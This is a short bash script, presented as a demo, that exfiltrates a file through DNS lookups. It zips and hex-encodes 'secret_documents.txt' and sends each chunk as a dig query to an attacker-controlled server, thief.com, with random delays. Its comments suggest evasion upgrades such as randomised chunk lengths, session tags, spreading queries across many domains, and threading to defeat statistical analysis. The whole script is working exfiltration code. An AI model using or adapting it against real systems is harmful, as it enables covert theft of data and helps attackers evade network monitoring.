#!/usr/bin/env bash
# This is meant to demonstrate basic data exfil through DNS lookups.
#
# Some notes:
#
# sleep delay - modify this to meet the amoung of time you have. Default of 'random val up to 20' would be overly long for large files single threaded.
#
# hexlines: this is a demo so they're all improbably and uniformly long. A better version of this would randomize the lengths to make
# statistical analysis harder. e.g. 504b030414000000080037bc03530b2c23bbf40700004111000014001c00 becomes 
# 504b03041.host.com, 400000.host.com, 008.host.com, etc. 
# A better version of this might make these subdomain lookups and add ID string
# into the lookup to make them easier to extract.
# e.g. 504b030414.marketing123.host.com - extract on marketing123 per session.
# Another version might multiplex these in slightly different formats across 100 domains that all logged to the same place. 
# If threading and randomization are added this would make it harder for simple statistical analysis, though bayesian analysis
# would still be useful.
# 

# You must control a DNS server, in this case called thief.com
SERVER=thief.com
# this presumes you have a large file called "secrets_documents.txt"
zip secret_documents.zip secret_documents.txt
# create a hex file from the binary#
xxd -p secret_documents.zip >  secret_documents.hex

# upload each line as queries to your server
for line in $(cat secret_documents.hex)
do
dig $line.${SERVER}
sleep $[ ( $RANDOM % 20 )  + 1 ]s
done

# end
